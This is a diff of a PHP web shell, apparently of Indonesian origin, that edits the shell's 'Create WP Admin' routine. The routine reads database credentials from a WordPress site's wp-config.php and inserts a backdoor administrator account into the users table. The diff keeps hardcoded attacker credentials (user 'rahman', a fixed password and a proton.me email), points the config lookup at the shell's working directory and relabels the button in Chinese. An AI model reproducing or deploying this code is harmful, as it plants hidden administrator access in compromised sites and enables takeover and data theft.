@@ -260,12 +260,12 @@ if(isset($_POST['berkas']) && is_string($_POST['berkas']))
 }
 $default_dir = str_replace("\\", "/", $default_dir);
 if (isset($_POST['create_wp_admin'])) {
-    // Tentukan path ke wp-config.php berdasarkan document root
-    $wp_config_path = getcwd() . '/wp-config.php';
+    // Ganti getcwd() dengan $default_dir
+    $wp_config_path = $default_dir . '/wp-config.php';
     if (file_exists($wp_config_path)) {
         echo "wp-config.php ditemukan di: " . $wp_config_path;
-        // Lanjutkan proses dengan file ini, misalnya, baca isinya:
         $config_content = file_get_contents($wp_config_path);
+        
         // Fungsi untuk mengambil nilai constant dari wp-config.php
         function get_wp_config_value($content, $constant) {
             if (preg_match("/define\(\s*'".preg_quote($constant, '/')."',\s*'([^']+)'/", $content, $matches)) {
@@ -295,8 +295,8 @@ if (isset($_POST['create_wp_admin'])) {
             $admin_username      = 'rahman';
             $admin_password_plain = 'xm4nxp1337';
             $admin_password      = md5($admin_password_plain); // MD5 sesuai referensi
-            $admin_email         = 'rahmanganteng1337@proton.me'; // Ubah jika perlu
-
+            $admin_email         = 'rahmanganteng1337@proton.me';
+            
             // Sisipkan user admin ke tabel wp_users
             $insert_user = "INSERT INTO `{$db_prefix}users` 
                 (user_login, user_pass, user_nicename, user_email, user_status) 
@@ -319,7 +319,7 @@ if (isset($_POST['create_wp_admin'])) {
             }
         }
     } else {
-        echo "wp-config.php tidak ditemukan di: " . getcwd();
+        echo "wp-config.php tidak ditemukan di: " . $default_dir;
     }
 }
 
@@ -933,13 +933,13 @@ a {
      style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
     SQL
   </a>
-    <!-- Tombol Create WP Admin -->
     <form method="POST" action="" style="display:inline-block;">
-      <button type="submit" name="create_wp_admin" 
-              style="padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; border: none; border-radius: 5px;">
-          Create WP Admin
-      </button>
-  </form>
+        <button type="submit" name="create_wp_admin" 
+                style="padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; border: none; border-radius: 5px;">
+            创建管理员
+        </button>
+    </form>
+
 </div>
 <?php
 // Tampilkan pesan sukses atau error jika ada
